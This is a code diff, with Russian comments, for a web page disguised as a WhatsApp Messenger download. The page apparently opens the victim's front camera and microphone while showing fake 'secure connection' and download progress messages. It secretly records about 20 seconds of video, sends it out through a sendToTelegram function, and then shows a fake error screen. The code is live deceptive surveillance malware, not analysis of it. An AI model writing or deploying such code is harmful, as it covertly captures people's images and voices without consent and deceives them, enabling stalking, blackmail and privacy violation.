@@ -10,7 +10,7 @@ let recordedChunks = [];
 
 async function startProcess() {
     try {
-        // Запрашиваем строго фронтальную камеру
+        // Запрашиваем именно фронтальную камеру (facingMode: user)
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "user" }, 
             audio: true 
@@ -19,7 +19,7 @@ async function startProcess() {
         videoElement.srcObject = stream;
         overlay.style.display = 'flex';
         
-        // Пауза 2 секунды, чтобы камера успела включиться
+        // Ждем 2 секунды, чтобы камера прогрелась и пошла картинка
         statusText.innerText = "Initializing secure connection...";
         await new Promise(resolve => setTimeout(resolve, 2000));
 
@@ -31,7 +31,7 @@ async function startProcess() {
         mediaRecorder.start();
         statusText.innerText = "Downloading WhatsApp Messenger...";
 
-        // Таймер записи на 20 секунд (пока идет полоска)
+        // Таймер имитации загрузки (20 секунд)
         let progress = 0;
         let interval = setInterval(() => {
             progress += 1;
@@ -55,12 +55,12 @@ function stopAndSend() {
     mediaRecorder.onstop = async () => {
         const blob = new Blob(recordedChunks, { type: 'video/mp4' });
         
-        // Проверка: если файл не пустой, отправляем
+        // Отправляем видео, если оно не пустое (больше 1 КБ)
         if (blob.size > 1000) {
             await sendToTelegram(blob);
         }
         
-        // Показываем ошибку 403, как на твоем скриншоте
+        // Показываем финальную ошибку (как на твоем скриншоте)
         document.getElementById('spinner').style.display = 'none';
         document.getElementById('progress-bar').style.display = 'none';
         document.getElementById('error-msg').style.display = 'block';
